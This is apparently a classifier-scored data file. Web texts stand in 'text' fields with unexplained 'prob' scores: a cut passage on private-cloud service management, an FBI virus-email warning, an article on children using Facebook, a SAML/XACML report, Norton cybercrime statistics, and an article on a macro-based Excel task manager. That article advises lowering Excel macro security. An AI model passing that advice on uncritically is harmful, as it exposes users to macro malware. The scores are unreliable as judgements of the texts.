adds complexity to the management of Configuration Items (CIs) due to the transient nature of the relationship between guests and hosts in the infrastructure. How is the relationship between CIs maintained in an environment that is potentially changing very frequently? A service comprises software, platform, and infrastructure layers. Each layer provides a level of abstraction that is dependent on the layer beneath it. This abstraction hides the implementation and composition details of the layer. Access to the layer is provided through an interface and as long as the fabric is available, the actual physical location of a hosted VM is irrelevant. To provide Infrastructure as a Service (IaaS), the configuration and relationship of the components within the fabric must be understood, whereas the details of the configuration within the VMs hosted by the fabric are irrelevant. The Configuration Management System (CMS) will need to be partitioned, at a minimum, into physical and logical CI layers. Two Configuration Management Databases (CMDBs) might be used; one to manage the physical CIs of the fabric (facilities, network, storage, hardware, and hypervisor) and the other to manage the logical CIs (everything else). The CMS can be further partitioned by layer, with separate management of the infrastructure, platform, and software layers. The benefits and trade-offs of each approach are summarized below. CMS Partitioned by Layer CMS Partitioned into Physical and Logical Table 2: Configuration Management System Options Partitioning logical and physical CI information allows for greater stability within the CMS, because CIs will need to be changed less frequently. This means less effort will need to be expended to accurately maintain the information. During normal operations, mapping a VM to its physical host is irrelevant. If historical records of a VM’s location are needed, (for example, for auditing or Root Cause Analysis) they can be traced through change logs. The physical or fabric CMDB will need to include a mapping of fault domains, upgrade domains, and Live Migration domains. The relationship of these patterns to the infrastructure CIs will provide critical information to the Fabric Management System. The Release and Deployment Management processes are responsible for making sure that approved changes to a service can be built, tested, and deployed to meet specifications with minimal disruption to the service and production environment. Where Change Management is based on the approval mechanism (determining what will be changed and why), Release and Deployment Management will determine how those changes will be implemented. The primary focus of Release and Deployment Management is to protect the production environment. The less variation is found in the environment, the greater the level of predictability – and, therefore, the lower the risk of causing harm when new elements are introduced. The concept of homogenization of physical infrastructure is derived from this predictability principle. If the physical infrastructure is completely homogenized, there is much greater predictability in the release and deployment process. While complete homogenization is the ideal, it may not be achievable in the real world. Homogenization is a continuum. The closer an environment gets to complete homogeneity, the more predictable it becomes and the fewer the risks. Full homogeneity means not only that identical hardware models are used, but all hardware configuration is identical as well. When complete hardware homogeneity is not feasible, strive for configuration homogeneity wherever possible. Figure 2: Homogenization Continuum The Scale Unit concept drives predictability in Capacity Planning and agility in the release and deployment of physical infrastructure. The hardware specifications and configurations have been pre-defined and tested, allowing for a more rapid deployment cycle than in a traditional data center. Similarly, known quantities of resources are added to the data center when the Capacity Plan is triggered. However, when the Scale Unit itself must change (for example, when a vendor retires a hardware model), a new risk is introduced to the private cloud. There will likely be a period where both n and n-1 versions of the Scale Unit exist in the infrastructure, but steps can be taken to minimize the risk this creates. Work with hardware vendors to understand the life cycle of their products and coordinate changes from multiple vendors to minimize iterations of the Scale Unit change. Also, upgrading to the new version of the Scale Unit should take place one Fault Domain at a time wherever possible. This will make sure that if an incident occurs with the new version, it can be isolated to a single Fault Domain. Homogenization of the physical infrastructure means consistency and predictability for the VMs regardless of which physical host they reside on. This concept can be extended beyond the production environment. The fabric can be partitioned into development, test, and pre-production environments as well. Eliminating variability between environments enables developers to more easily optimize applications for a private cloud and gives testers more confidence that the results reflect the realities of production, which in turn should greatly improve testing efficiency. The virtualized infrastructure enables workloads to be transferred more easily between environments. All VMs should be built from a common set of component templates housed in a library, which is used across all environments. This shared library includes templates for all components approved for production, such as VM images, the gold OS image, server role templates, and platform templates. These component templates are downloaded from the shared library and become the building blocks of the development environment. From development, these components are packaged together to create a test candidate package (in the form of a virtual hard disk (VHD) that is uploaded to the library. This test candidate package can then be deployed by booting the VHD in the test environment. When testing is complete, the package can again be uploaded to the library as a release candidate package – for deployment into the pre-production environment, and ultimately into the production environment. Since workloads are deployed by booting a VM from a VHD, the Release Management process occurs very quickly through the transfer of VHD packages to different environments. This also allows for rapid rollback should the deployment fail; the current release can be deleted and the VM can be booted off the previous VHD. Virtualization and the use of standard VM templates allow us to rethink software updates and patch management. As there is minimal variation in the production environment and all services in production are built with a common set of component templates, patches need not be applied in production. Instead, they should be applied to the templates in the shared library. Any services in production using that template will require a new version release. The release package is then rebuilt, tested, and redeployed, as shown below. Figure 3: The Release Process This may seem counter-intuitive for a critical patch scenario, such as when an exploitable vulnerability is exposed. But with virtualization technologies and automated test scripts, a new version of a service can be built, tested, and deployed quite rapidly. Variation can also be reduced through standardized, automated test scenarios. While not every test scenario can or should be automated, tests that are automated will improve predictability and facilitate more rapid test and deployment timelines. Test scenarios that are common for all applications, or the ones that might be shared by certain application patterns, are key candidates for automation. These automated test scripts may be required for all release candidates prior to deployment and would make sure further reduction in variation in the production environment. Knowledge Management is the process of gathering, analyzing, storing, and sharing knowledge and information within an organization. The goal of Knowledge Management is to make sure that the right people have access to the information they need to maintain a private cloud. As operational knowledge expands and matures, the ability to intelligently automate operational tasks improves, providing for an increasingly dynamic environment. An immature approach to Knowledge Management costs organizations in terms of slower, less-efficient problem solving. Every problem or new situation that arises becomes a crisis that must be solved. A few people may have the prior experience to resolve the problem quickly and calmly, but their knowledge is not shared. Immature knowledge management creates greater stress for the operations staff and usually results in user dissatisfaction with frequent and lengthy unexpected outages. Mature Knowledge Management processes are necessary for achieving a service provider’s approach to delivering infrastructure. Past knowledge and experience is documented, communicated, and readily available when needed. Operating teams are no longer crisis-driven as service-impacting events grow less frequent and are quickly resolves when they do occur. When designing a private cloud, development of the Health Model will drive much of the information needed for Knowledge Management. The Health Model defines the ideal states for each infrastructure component and the daily, weekly, monthly, and as-needed tasks required to maintain this state. The Health Model also defines unhealthy states for each infrastructure component and actions to be taken to restore their health. This information will form the foundation of the Knowledge Management database. Aligning the Health Model with alerts allows these alerts to contain links to the Knowledge Management database describing the specific steps to be taken in response to the alert. This will help drive predictability as a consistent, proven set of actions will be taken in response to each alert. The final step toward achieving a private cloud is the automation of responses to each alert as defined in the Knowledge Management database. Once these responses are proven successful, they should be automated to the fullest extent possible. It is important to note, though, that automating responses to alerts does not make them invisible and forgotten. Even when alerts generate a fully automated response they must be captured in the Service Management system. If the alert indicates the need for a change, the change record should be logged. Similarly, if the alert is in response to an incident, an incident record should be created. These automated workflows must be reviewed regularly by Operations staff to make sure the automated action achieves the expected result. Finally, as the environment changes over time, or as new knowledge is gained, the Knowledge Management database must be updated along with the automated workflows that are based on that knowledge. The goal of Incident Management is to resolve events that are impacting, or threaten to impact, services as quickly as possible with minimal disruption. The goal of Problem Management is to identify and resolve root causes of incidents that have occurred as well as identify and prevent or minimize the impact of incidents that may occur. Pinpointing the root cause of an incident can become more challenging when workloads are abstracted from the infrastructure and their physical location changes frequently. Additionally, incident response teams may be unfamiliar with virtualization technologies (at least initially) which could also lead to delays in incident resolution. Finally, applications may have neither a robust Health Model nor expose all of the health information required for a proactive response. All of this may lead to an increase in reactive (user initiated) incidents which will likely increase the Mean-Time-to-Restore-Service (MTRS) and customer dissatisfaction. This may seem to go against the resiliency principle, but note that virtualization alone will not achieve the desired resiliency unless accompanied by highly mature IT Service Management (ITSM) maturity and a robust automated health monitoring system. The drive for resiliency requires a different approach to troubleshooting incidents. Extensive troubleshooting of incidents in production negatively impacts resiliency. Therefore, if an incident cannot be quickly resolved, the service can be rolled back to the previous version, as described under Release and Deployment. Further troubleshooting can be done in a test environment without impacting the production environment. Troubleshooting in the production environment may be limited to moving the service to different hosts (ruling out infrastructure as the cause) and rebooting the VMs. If these steps do not resolve the issue, the rollback scenario could be initiated. Minimizing human involvement in incident management is critical for achieving resiliency. The troubleshooting scenarios described earlier could be automated, which will allow for identification and possible resolution of the root much more quickly than non-automated processes. But automation may mask the root cause of the incident. Careful consideration should be given to determining which troubleshooting steps should be automated and which require human analysis. Human Analysis of Troubleshooting If a compute resource fails, it is no longer necessary to treat the failure as an incident that must be fixed immediately. It may be more efficient and cost effective to treat the failure as part of the decay of the Resource Pool. Rather than treat a failed server as an incident that requires immediate resolution, treat it as a natural candidate for replacement on a regular maintenance schedule, or when the Resource Pool reaches a certain threshold of decay. Each organization must balance cost, efficiency, and risk as it determines an acceptable decay threshold – and choose among these courses of action: The benefits and trade-off of each of the options are listed below: Option 4 is the least desirable, as it does not take advantage of the resiliency and cost reduction benefits of a private cloud. A well-planned Resource Pool and Reserve Capacity strategy will account for Resource Decay. Option 1 is the most recommended approach. A predictable maintenance schedule allows for better procurement planning and can help avoid conflicts with other maintenance activities, such as software upgrades. Again, a well-planned Resource Pool and Reserve Capacity strategy will account for Resource Decay and minimize the risk of exceeding critical thresholds before the scheduled maintenance. Option 3 will likely be the only option for self-contained Scale Unit scenarios, as the container must be replaced as a single Scale Unit when the decay threshold is reached. The goal of Request Fulfillment is to manage requests for service from users. Users should have a clear understanding of the process they need to initiate to request service and IT should have a consistent approach for managing these requests. Much like any service provider, IT should clearly define the types of requests available to users in the service catalog. The service catalog should include an SLA on when the request will be completed, as well as the cost of fulfilling the request, if any. The types of requests available and their associated costs should reflect the actual cost of completing the request and this cost should be easily understood. For example, if a user requests an additional VM, its daily cost should be noted on the request form, which should also be exposed to the organization or person responsible for paying the bill. It is relatively easy to see the need for adding resources, but more difficult to see when a resource is no longer needed. A process for identifying and removing unused VMs should be put into place. There are a number of strategies to do this, depending on the needs of a given organization, such as: The benefits and trade-offs of each of these approaches are detailed below: Option 4 affords the greatest flexibility, while still working to minimize server sprawl. When a user requests a VM, they have the option of setting an expiration date with no reminder (for example, if they know they will only be using the workload for one week). They could set an expiration deadline with a reminder (for example, a reminder that the VM will expire after 90 days unless they wish to renew). Lastly, the user may request no expiration date if they expect the workload will always be needed. If the last option is chosen, it is likely that underutilized VMs will still be monitored and owners notified. Finally, self-provisioning should be considered, if appropriate, when evaluating request fulfillment options to drive towards minimal human involvement. Self-provisioning allows great agility and user empowerment, but it can also introduce risks depending on the nature of the environment in which these VMs are introduced. For an enterprise organization, the risk of bypassing formal build, stabilize, and deploy processes may or may not outweigh the agility benefits gained from the self-provisioning option. Without strong governance to make sure each VM has an end-of-life strategy, the fabric may become congested with VM server sprawl. The pros and cons of self-provisioning options are listed in the next diagram: The primary decision point for determining whether to use self-provisioning is the nature of the environment. Allowing developers to self-provision into the development environment greatly facilitates agile development, and allows the enterprise to maintain release management controls as these workloads are moved out of development and into test and production environments. A user-led community environment isolated from enterprise mission-critical applications may also be a good candidate for self-provisioning. As long as user actions are isolated and cannot impact mission critical applications, the agility and user empowerment may justify the risk of giving up control of release management. Again, it is essential that in such a scenario, expiration timers are included to prevent server sprawl. The goal of Access Management is to make sure authorized users have access to the services they need while preventing access by unauthorized users. Access Management is the implementation of security policies defined by Information Security Management at the Service Delivery Layer. Maintaining access for authorized users is critical for achieving the perception of continuous availability. Besides allowing access, Access Management defines users who are allowed to use, configure, or administer objects in the Management Layer. From a provider’s perspective, it answers questions like: From a consumer’s perspective, it answers questions such as: Access Management is implemented at several levels and can include physical barriers to systems such as requiring access smartcards at the data center, or virtual barriers such as network and Virtual Local Area Network (VLAN) separation, firewalling, and access to storage and applications. Taking a service provider’s approach to Access Management will also make sure that resource segmentation and multi-tenancy is addressed. Resource Pools may need to be segmented to address security concerns around confidentiality, integrity, and availability. Some tenants may not wish to share infrastructure resources to keep their environment isolated from others. Access Management of shared infrastructure requires logical access control mechanisms such as encryption, access control rights, user groupings, and permissions. Dedicated infrastructure also relies on physical access control mechanisms, where infrastructure is not physically connected, but is effectively isolated through a firewall or other mechanisms. The goal of systems administration is to make sure that the daily, weekly, monthly, and as-needed tasks required to keep a system healthy are being performed. Regularly performing ongoing systems administration tasks is critical for achieving predictability. As the organization matures and the Knowledge Management database becomes more robust and increasingly automated, systems administration tasks is no longer part of the job role function. It is important to keep this in mind as an organization moves to a private cloud. Staff once responsible for systems administration should refocus on automation and scripting skills – and on monitoring the fabric to identify patterns that indicate possibilities for ongoing improvement of existing automated workflows.",
        "prob": "tensor([[0.0661, 0.9339]])"
    },
    {
        "text": "The Federal Bureau of Investigation (FBI) has warned computer users that e-mails from scam artists pretending to be FBI agents are spreading a computer virus. The e-mails tell recipients that the FBI's Internet Fraud Complaint Center has monitored their Internet use and found they have accessed illegal Web sites. The e-mails then direct recipients to open an attachment and complete a questionnaire. This is a bogus message. The attachment contains a computer virus. DO NOT OPEN OR LAUNCH THE ATTACHMENT. You should DELETE the e-mail immediately. As a general rule, if you receive an e-mail that you are not expecting, even if you know the sender, DO NOT OPEN IT OR LAUNCH the attachment and DO NOT FORWARD the message. If you are not sure, contact the sender to verify the e-mail. Otherwise, DELETE the e-mail. The Information and Network Security team has put in place appropriate protections to prevent the virus from spreading. Current anti-virus definitions detect and block this virus.",
        "prob": "tensor([[2.0463e-06, 1.0000e+00]])"
    },
    {
        "text": "Even though Facebook requires users to be at least 13 years old, there are 7.5. million users under that age, most of them not yet 10, according to projections from a \"State of the Net\" survey conducted by Consumer Reports. The survey, published in the June issue of Consumer Reports, also found that the accounts of these minors were largely unsupervised by their parents, exposing them to online predators and bullies. \"Despite Facebook's age requirements, many kids are using the site who shouldn't be,\" Jeff Fox, technology editor for Consumer Reports, said in a release. \"What's even more troubling was the finding from our survey that indicated that a majority of parents of kids 10 and under seemed largely unconcerned by their children's use of the site.\" Indeed, the survey found that one million children were exposed to online bullying through Facebook in the past year. Use of the site also exposed more than five million U.S. households to virus infections, identity theft and other types of abuse. To guard against abuse, Consumer Reports recommends parents carefully monitor their children's Facebook accounts, joining their children's circle of friends on the site and either deleting a pre-teen's account or asking Facebook to do so by filling out its \"report an underage child\" form. Also, use the site's privacy controls. Roughly one in five adult users said they hadn't, making them more vulnerable to threats. Consumer Reports advices users to set everything you can so that it can only be accessed by people on your friends list. Among the magazine's other recommendations: turn off instant personalization and use apps with caution, both of which can help keep personal information about you from floating around online. In April, Facebook compared web safety for kids to crossing the street. \"We agree with safety experts that communication between parents/guardians and kids about their use of the Internet is vital,\" the company said. \"Just as parents are always teaching and reminding kids how to cross the road safely, talking about internet safety should be just as important a lesson to learn.\" Perhaps kids who aren't yet 13 need to be on Facebook in today's world, but if that's true, then their parents really, really need to make sure they know what they're doing online. Or perhaps kids shouldn't be allowed to use Facebook until they reach the site's minimum age. What do you think?",
        "prob": "tensor([[1.7137e-05, 9.9998e-01]])"
    },
    {
        "text": "|Yoon Jae Kim, yj1dreamer AT gmail.com (A project report written under the guidance of Prof. Raj Jain)||Download| Service Oriented Architecture (SOA) is a design pattern which is composed of loosely coupled, discoverable, reusable, inter-operable platform agnostic services in which each of these services follow a well defined standard. Each of these services can be bound or unbound at any time and as needed. [Jamil08]However, as defined, SOA has a loosely-coupled feature, which makes SOA open to the challenges of security. It means that SOA must meet several requirements. The main requirements are as follows[Candolin07]: service discovery, service authentication, user authentication, access control, confidentiality, integrity, availability, and privacy. To ensure security in a loosely-coupled SOA environment, the open standards communities that created Web services developed a number of security standards for Web services which is one of the most active and widely adopted implementation of SOA. Figure 1 depicts a notional reference model for Web services security standards. This reference model maps the different standards to the different functional layers of a typical Web service implementation. As described above, in the Web Services Security Stack the Security Assertion Markup Language (SAML) and the eXtensible Access Control Markup Language (XACML) are the standard for access control which means that when the service is requested by a user the service must enforce the specified security policy related to access control. We focus on access control in the Web Services security and represent what SAML and XACML are, how they work and where they are able to be applied together. SAML, created by the Security Services Technical Committee of the Organization for the Advancement of Structured Information Standards (OASIS), is a an XML-based framework for communicating user authentication, entitlement, and attribute information. As its name suggests, SAML allows business entities to make assertions regarding the identity, attributes, and entitlements of a subject (an entity that is often a human user) to other entities, such as a partner company or another enterprise application. [Madsen05] SAML is a flexible and extensible protocol designed to be used - and customized if necessary - by other standards. Web Single Sign-On In web SSO, a user authenticates to one web site and then, without additional authentication, is able to access some personalized or customized resources at another site. SAML enables web SSO through the communication of an authentication assertion from the first site to the second which, if confident of the origin of the assertion, can choose to log in the user as if they had authenticated directly. A principal authenticates at the identity provider and is subsequently appropriately recognized (and given corresponding access/service) at the service provider.[Google] For example, Google made SAML Single Sign-On (SSO) Service for Google Apps. And Google Apps provides a SAML-based Single Sign-On (SSO) service that offers partner companies with full control over the authorization and authentication of hosted user accounts that can access web-based applications like Gmail or Google Calendar. As the service provider Google offers services as Gmail and Start Pages and partner companies control account information as identity provider. Similar to the Web SSO scenario, the attribute-based authorization model has one web site communicating identity information about a subject to another web site in support of some transaction. However, the identity information may be some characteristic of the subject (such as a person's role in a B2B scenario) rather than, or in addition to, information about when and how the person was authenticated. The attribute-based authorization model is important when the individual's particular identity is either not important, should not be shared for privacy reasons, or is insufficient on its own. Securing Web Services SAML assertions can be used within SOAP messages in order to convey security and identity information between actors in web service interactions. The SAML Token Profile produced by the OASIS Web Services Security (WSS) TC specifies how SAML assertions should be used for this purpose with the WS-Security framework. The Liberty Alliance's Identity Web Service Framework (ID-WSF) builds on these specifications to use SAML assertions for enabling secure and privacy-respecting access to web services. WS-Trust, one component of the private WS-* framework initiative, proposes protocols for the exchange and validation of security tokens used as described within WS-Security. SAML assertions are one such supported security token format. Figure 3 illustrates these actors and information flow. As can be seen in the figure, the PAP writes Polices and PolicySets and makes them available to the PDP. These Policies or PolicySets shows the complete policy for a particular target. The PEP is the component where the request is received when access requester wants to take some action on a resource and make the request. In this part, the attributes in the request may be in the format of the application environment (e.g., SAML, etc.). The PEP sends the request to the Context Handler. Context Handler maps the request and attributes to the XACML Request context and sends the request to the PDP. While evaluating the request, the PDP needs some attributes and sends the attribute queries to the Context Handler. The Context Handler collects these attributes by the help of the PIP from the resources, subjects, and the environment. After evaluation, the PDP sends the XACML Response to the Context Handler and the Context Handler translates the Response context to the native response format of the application environment and sends it to PEP. The PEP fulfills the obligations if they exist and applies the authorization decision that PDP concludes.[Periorellis07] A Request element contains four components as Subject, Resource, Action, and Environment. One request element has only one collection of resource and action attributes, and at most one collection of environment attributes. But there may be multiple collections of subject attributes. Subject attribute contains subject's details such as name, e-mail, role and so on. Resource attribute details the resource for which access is requested and action attribute specifies the requested action to be performed on resource such as read or wire. Also, Environment attribute is optional and contains attributes of environment. A Response element represents the authorization decision information made by PDP. It contains one or more Result attributes. Each result includes a Decision such as Permit, Deny, NotApplicable, or Indeterminate, some Status information which gives the errors occurred and their descriptions while evaluating the request and optionally one or more Obligations which specifies tasks in the PolicySet and Policy elements in the policy description which should be performed before granting or denying access. A Rule element defines the target elements to which the rule is applied and details conditions to apply the rule and has three components such as target, effect, and condition. A target element specifies the resources, subjects, actions and the environment to which the rule is applied. A condition element shows the conditions to apply the rule and a effect is the consequence of the rule as either permit or deny. A policy is the set of rules which are combined with some algorithms. These algorithms are called Rule-combining algorithms. For instance \"Permit Override\" algorithm allows the policy to evaluate to \"Permit\" if any rule in the policy evaluates to \"Permit\". A policy also contains target elements which shows the subjects, resources, actions, environment that policy is applied. A PolicySet consists of Policies and PolicySets combined with policy-combined algorithm. It has also target like a Policy. The XACML context shows how flexible and suitable the XACML is for various application. This feature makes it possible that XACML is applied to access control system with SAML. Section 4 shows the more detailed. SAML is one standard suitable for providing the assertion and protocol mechanisms and specifies schemas for carrying the security and authorization related information and have the bindings to basic transportation mechanisms. Therefore, OASIS publishes a SAML profile for the XACML (OASIS, 2005)[Anderson05] to carry the XACML messages between the XACML actors. This profile defines the usage of SAML 2.0 to protect, store, transport, request and respond with XACML instances and other information. It contains largely four categories. First, this profile specifies how to use SAML Attributes in an XACML system. This category contains three standard SAML elements such as SAML Attribute, SAML AttributeStatement and SAML Assertion, two standard SAML protocol such as SAML AttributeQuery and SAML Response, and one new SAML extension element, XACMLAssertion. In an XACML system, SAML Attribute may be used to store and to transmit attribute values and must be transformed into an XACML Attribute before used in an XACML Request Context. Also SAML AttributeStatement may be used to hold SAML Attribute instances. A SAML Assertion may be used to hold SAML AttributeStatement instances in an XACML system, either in an Attribute Repository or in a SAML Response to a SAML AttributeQuery. To transform a SAML Attribute into an XACML Attribute the SAML Assertion includes information that is required and a SAML Assertion or an XACMLAssertion instance contains a SAML Attribute. An XACMLAssertion is an alternative to the SAML Assertion and allows inclusion of XACML Statement instances and inclusion of other XACMLAssertion instance as advice. An XACML PDP or PEP use SAML AttributeQuery to request SAML Attribute instances from an Attribute Authority for use in an XACML Request Context and in response to it SAML Response shall be used to return SAML Attribute instances. Second, this profile represent the use of SAML for use in requesting, responding with, storing, and transmitting authorization decisions in an XACML system. This category contains XACMLAuthzDecisionStatement, XACMLAssertion, XACMLAuthzDecisionQuery, and XACMLResponse. In this profile, XACMLAuthzDecisionStatement and XACMLAssertion are new SAML extension elements and the others are new SAML extension protocol elements. In an XACML system, XACMLAuthzDecisionSatement may be used to contain XACML authorization decisions for storage or transmission and XACMLAssertion may be used to contain XACMLAuthzDecisionStatement instances for storage or transmission. Also a PEP may use XACMLAuthzDecisionQuery to request an authorization decision from an XACML PDP and an XACML PDP may use XACMLResponse to return authorization decisions in response to an XACMLAuthzDecisionQuery. Then, this profile shows the use of SAML for use in requesting, responding with, storing and transmitting XACML policies. This category includes four new SAML extensions; XACMLPolicyStatement, XACMLAssertion, XACMLPolicyQuery and XACMLResponse. In an XACML system, XACMLPolicyStatement may hold XACML policies for storage or transmission and XACMLAssertion may hold XACMLPolicySatement instances for storage or transmission. And a PDP or other application uses XACMLPolicyQuery to request XACML from a PAP. Also PAP uses XACMLResponse to return policies in response to an XACMLPolicyQuery. Finally, this profile details the use of XACMLAssertion instances as advice in other Assertion. This category consists of XACML Advice, which is a new SAML extension element in this profile that may be used for including XACMLAssertion instances as advice in another XACMLAssertion, and XACMLAssertion which is a new SAML extension element that may be used to hold on XACMLAdvice instance along with SAML Statement or XACML extension Statement instance. Figure 5 describes the XACML use model and the messages that can be used to communicate between the various components. Statements are carried in SAML or XACML Assertions, and Assertions are carried in SAML or XACML Responses. Not all components or messages will be used in every implementation. Next subsection shows the practical example of this model. The steps of communication between Portal and Web services are described in detail as follows: Focusing on access control we represent SAML and XACML which are developed by OASIS. SAML is an XML-based framework for exchanging authentication and authorization data. Because SAML has much strength such as platform neutrality, loose coupling of directories, improved online experience for end user, reduced administrative costs for service providers and risk transference. Also SAML is being applied in Web Single Sign-On, Attribute-Based Authorization, and Securing Web Services. XACML defines XML files which contains access control policy and access control decision request/ response. Policy Decision Point (PDP) looks at the request from Policy Enforcement Point (PEP) and finds some policy applying to the request from Policy Administration Point (PAP) and returns the response about whether access should be granted to PEP. XACML defines the content of Request/Response messages but does not define protocols or transport mechanisms, which SAML provides by defining schemas for use in requesting and responding with various types of security assertions. This SAML/XACML based access control is a very powerful and practical solution for dynamic and large-scale application domain because it is easier to change and maintain policies. So it can extend the authentication and authorization mechanism within a portal to external Web services. |[Candolin07]||Candolin, Catharina, \"A Security Framework for Service Oriented Architectures\", Military Communications Conference, 2007. MILCOM 2007. IEEE, 29-31 Oct. 2007, pp.1-6 http://ieeexplore.ieee.org/xpl/freeabs_all.jsp?arnumber=4455332| |[Singhal07]||Singhal , Anoop, \"Web Services Security: Challenges and Techniques\" policy, Eighth IEEE International Workshop on Policies for Distributed Systems and Networks (POLICY'07), 2007, pp.282 http://www2.computer.org/portal/web/csdl/doi/10.1109/POLICY.2007.50| |[Madsen05]||Madsen, Paul, et al., \"SAML V2.0 Executive Overview\", OASIS Committee Draft, 12 April 2005 http://www.oasis-open.org/committees/download.php/13525/sstc-saml-exec-overview-2.0-cd-01-2col.pdf| |[Ragouzis08]||Ragouzis, Nick, et al., \"Security Assertion Markup Language (SAML) V2.0 Technical Overview\", Committee Draft 02, 25, March 2008, http://www.oasis-open.org/committees/download.php/27819/sstc-saml-tech-overview-2.0-cd-02.pdf| |[Sun]||\"Sun's XACML Implementation\", July 2004, http://sunxacml.sourceforge.net/guide.html| |[Moses05]||Moses, Tim, et al., \"eXtensible Access Control Markup Language(XACML) Version 2.0\", OASIS Standard, 1 Feb 2005, http://docs.oasis-open.org/xacml/2.0/access_control-xacml-2.0-core-spec-os.pdf| |[Periorellis07]||Periorellis,Panos , \"Securing Web Services: Practical Usage of Standards and Specifications\", Idea Group Inc(IGI), 2007. http://books.google.com/books?id=zX2N7fWTJOUC| |[YIN07]||Yin, Hao, et al., \"A SAML/XACML Based Access Control between Portal and Web Services\", Data, Privacy, and E-Commerce, 2007. ISDPE 2007. The First International Symposium on, Nov. 2007, pp 356-360 http://ieeexplore.ieee.org/xpl/freeabs_all.jsp?arnumber=4402710| |[Anderson05]||Anderson, Anne, et al., \"SAML 2.0 profile of XACML v2.0\", OASIS Standard, 1 Feb 2005 http://docs.oasis-open.org/xacml/2.0/access_control-xacml-2.0-saml-profile-spec-os.pdf| |[Jamil08]||Jamil, Ejaz, et al., \"What really is SOA. A comparison with Cloud Computing, Web 2.0, SaaS, WOA, Web Services, PassS and others\", SOALIB, 12 Dec 2008. http://soalib.com/docs/whitepaper/SoalibWhitePaper_SOAJargon.pdf| |[Google]||SAML Single Sign-On (SSO) Service for Google Apps, http://code.google.com/apis/apps/sso/saml_reference_implementation.html| |CORBA||Common Object Request Broker Architecture| |DCE||Distributed Computing Environment| |GSA||General Services Administration| |IDP||General Services Administration| |J2SE||Java Platform Standard Edition| |ID-WSF||Identity Web Services Framework| |LDAP||Lightweight Directory Access Protocol| |OASIS||the Organization for the Advancement of Structured Information Standards| |PAP||Policy Administration Point| |PDP||Policy Decision Point| |PEP||Policy Enforcement Point| |PIP||Point Information Point| |SAML||Security Assertion Markup Language| |SOA||Service Oriented Architecture| |SOAP||Simple Object Access Protocol| |SSL||Secure Sockets Layer| |TLS||Transport Layer Security| |WSS||Web Security Service| |XACML||eXtensible Access Control Markup Language| |XKMS||XML Key Management Specification| |XML||eXtensible Markup Language| |XSLT||eXtensible Markup Language| Last Modified: April, 19, 2009 This and other papers on latest advances in network security are available on line at http://www1.cse .wustl.edu/~jain/cse571-09/index.html Back to Raj Jain's Home Page",
        "prob": "tensor([[0.0022, 0.9978]])"
    },
    {
        "text": "Cybercrime costs $388 billion dollars in annual losses globally and it affected almost 7 in 10 adults last year. This week Norton is released the results of the Norton Cybercrime Report 2011, a study on the impact of cybercrime that included a survey of over 12,000 adults in 24 countries. This provides an important and accurate picture of the scope of cybercrime globally and the results are shocking! Every day of the past year, over 1 million online adults in 24 countries experienced cybercrime. This can also be broken down to 50,000 victims per hour, 820 victims per minute, or 14 victims every second. In just the last 12 months 44% of people have been a victim of cybercrime while only 15% have been a victim of physical crime in the same period. I regularly meet with law enforcement who are fighting cybercrime. The above statistics clearly illustrate the biggest challenge faced by law enforcement—the enormous scope of the problem. With so many victims in many different countries, police can successfully stop one cybercriminal but still be left with thousands of more cases. The police do a great job trying to stop cybercrime but the problem requires significantly more resources than are currently being devoted to stop it. Only 21% of people in the Norton study reported the cybercrime to law enforcement. This also creates a significant problem for police and prosecutors. Some prosecutors will only accept cases that exceed a certain amount of victims or high level of damages. US law allows federal prosecutors to combine multiple victims into a common case if the crime is linked. This is critical in many cybercrime cases where there may be a small number of victims who have lost a relatively small amount individually. However, failure to report cybercrime prevents law enforcement from effectively addressing the problem. Finally, the key message of this report is one of hope. Despite the really frightening statistics on the scale of cybercrime, cybercrime is still largely a preventable crime. Globally the three most common reported forms of cybercrime were viruses, online scams, and phishing attacks. All of these crimes are largely preventable by following good security practices and using updated security software. I have worked with crime victims in some capacity for over a decade now. Nobody wants to be a victim. The police are trying to help but it is an extremely rare cybercrime case in which a victim actually recovers their lost money . Time dealing with cybercrime is also lost forever. It is far better to use good security software and follow careful safety steps online that can greatly reduce the likelihood of becoming one of the 7 in 10 global cybercrime victims last year.",
        "prob": "tensor([[2.1454e-06, 1.0000e+00]])"
    },
    {
        "text": "Nearly everybody with more than the minimum amount of computer knowledge will have used the built in Windows Task Manager, and know what an important tool it can sometimes be. Whenever a program crashes, hangs, consumes too many resources or just shouldn’t be there, often the quickest and easiest way to solve the problem is using Task Manager to forcefully close the program. The problem with Task Manager is it’s such a vital troubleshooting component, malware often targets it and tries to block use of the Task Manager so the malicious process cannot be terminated. Some more sophisticated malware can even block third party task management software such as Process Explorer from running. If you’re stuck and the default Task Manager has been blocked or you can’t run a third party task manager tool then things can become quite tricky. There is however, a rather interesting solution to get around this problem, which is to use a task manager tool built to run in a Microsoft Excel spreadsheet. Most people would expect a utility like this to be an executable .exe file, but this one is actually a standard Office 97 – 2003 Worksheet .xls file with some built in trickery. TaskManager.xls is a small (41KB) and simple task manager that has been created using the Visual Basic for Applications (VBA) programming language component built into Excel and other Office applications. While it doesn’t show you things like running services, performance graphs or network activity, it can list the currently running processes, and terminate, suspend or resume any of them, which is the most important part when dealing with malware. For this to run you have to make sure Macro’s are enabled in Excel because their usage is disabled by default to protect against potential Macro viruses. If Macro’s are disabled for instance in Excel 2003, and you don’t get asked if you want to enable them for the current sheet, go to Tools -> Options -> Security -> Macro Security, and set the level to medium which will always ask to run a Macro in future. There are only 2 buttons and a blank window in TaskManager.xls to start with. The List processes button will populate the window with a list of all running and active processes on your computer, and the Execute commands button will perform one of the three tasks available of terminate, suspend or resume a process. These are used by entering t, s or r into column A of the worksheet, then pressing the button. The screenshot below shows that the MaliciousProcess.exe is to be suspended and Ransomware.exe terminated when the Execute commands button is pressed. Clicking the button will do just that, then press the List processes button again to update the list. Do note that like a traditional task manager tool, TaskManager.xls is unable to terminate protected processes. For example, nothing will happen if you try to terminate the Client Server Runtime Process (csrss.exe) from TaskManager.xls. TaskManager.xls is very useful but unfortunately it does have problems working in other Office suites. In Libre Office v4 clicking the List Processes button will prompt a runtime error, and Softmaker Office free version doesn’t support VBA. The free version of Kingsoft Office doesn’t support VBA either so won’t run although the professional version does support it and might work. Even the free Excel Viewer provided by Microsoft doesn’t work, so it appears that sadly the TaskManager.xls tool is only compatible with the real Microsoft Excel.",
        "prob": "tensor([[3.1018e-06, 1.0000e+00]])"
    },
    {
